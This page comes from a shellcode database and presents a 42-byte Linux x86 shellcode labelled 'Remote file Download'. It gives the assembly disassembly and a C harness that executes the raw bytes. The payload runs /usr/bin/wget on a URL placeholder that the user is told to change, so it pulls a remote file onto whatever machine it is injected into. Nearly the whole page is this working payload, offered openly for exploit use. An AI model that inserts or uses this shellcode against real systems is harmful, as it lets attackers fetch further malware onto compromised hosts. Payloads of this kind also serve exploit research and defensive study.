<html><head><title>Linux/x86 - Remote file Download - 42 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Title: 	 Linux x86 - Remote file Download - 42 bytes
Author:	 Jonathan Salwan &lt;submit AT shell-storm.org&gt;
Web:	 http://www.shell-storm.org
Twitter: http://twitter.com/jonathansalwan


!Database of Shellcodes http://www.shell-storm.org/shellcode/


08048054 &lt;.text&gt;:
 8048054:	6a 0b                	push   $0xb
 8048056:	58                   	pop    %eax
 8048057:	99                   	cltd   
 8048058:	52                   	push   %edx
 8048059:	68 61 61 61 61       	push   $0x61616161
 804805e:	89 e1                	mov    %esp,%ecx
 8048060:	52                   	push   %edx
 8048061:	6a 74                	push   $0x74
 8048063:	68 2f 77 67 65       	push   $0x6567772f
 8048068:	68 2f 62 69 6e       	push   $0x6e69622f
 804806d:	68 2f 75 73 72       	push   $0x7273752f
 8048072:	89 e3                	mov    %esp,%ebx
 8048074:	52                   	push   %edx
 8048075:	51                   	push   %ecx
 8048076:	53                   	push   %ebx
 8048077:	89 e1                	mov    %esp,%ecx
 8048079:	cd 80                	int    $0x80
 804807b:	40                   	inc    %eax
 804807c:	cd 80                	int    $0x80
*/

#include &lt;stdio.h&gt;

char sc[] = 	&quot;\x6a\x0b\x58\x99\x52&quot;
		&quot;\x68\x61\x61\x61\x61&quot; // Change it
		&quot;\x89\xe1\x52\x6a\x74&quot;
		&quot;\x68\x2f\x77\x67\x65&quot;
		&quot;\x68\x2f\x62\x69\x6e&quot;
		&quot;\x68\x2f\x75\x73\x72&quot;
		&quot;\x89\xe3\x52\x51\x53&quot;
		&quot;\x89\xe1\xcd\x80\x40&quot;
		&quot;\xcd\x80&quot;;

int main(void)
{
       	fprintf(stdout,&quot;Length: %d\n&quot;,strlen(sc));
	(*(void(*)()) sc)();
     
return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
